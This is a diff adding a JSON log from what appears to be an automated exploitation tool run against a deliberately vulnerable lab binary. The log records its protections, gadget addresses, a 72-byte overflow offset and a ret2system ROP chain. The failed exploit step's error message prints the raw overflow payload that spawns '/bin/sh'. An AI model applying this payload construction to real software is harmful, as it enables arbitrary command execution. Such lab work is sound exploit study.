@@ -1,0 +1,36 @@
+{
+  "binary": "./vulnerable64",
+  "timestamp": "2026-10-25T18:31:40.620617",
+  "arch": "amd64",
+  "pie": false,
+  "canary": false,
+  "nx": null,
+  "phases": {
+    "recon": {
+      "system_plt": "0x401094",
+      "bin_sh": "0x404048",
+      "pop_rdi_ret": "0x4012b3"
+    },
+    "fuzz": {
+      "crash_size": 64
+    },
+    "offset": {
+      "offset": 72,
+      "method": "fallback"
+    },
+    "control_rip": {
+      "error": "Could not find core file for pid 4554"
+    },
+    "rop_chain": {
+      "offset": 72,
+      "padding": 72,
+      "pop_rdi": "0x4012b3",
+      "bin_sh": "0x404048",
+      "system": "0x401094",
+      "total_length": 96
+    },
+    "exploit": {
+      "error": "Inappropriate nulls in argv[1]: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xb3\\x12@\\x00\\x00\\x00\\x00\\x00H@@\\x00\\x00\\x00\\x00\\x00\\x94\\x10@\\x00\\x00\\x00\\x00\\x00'"
+    }
+  }
+}
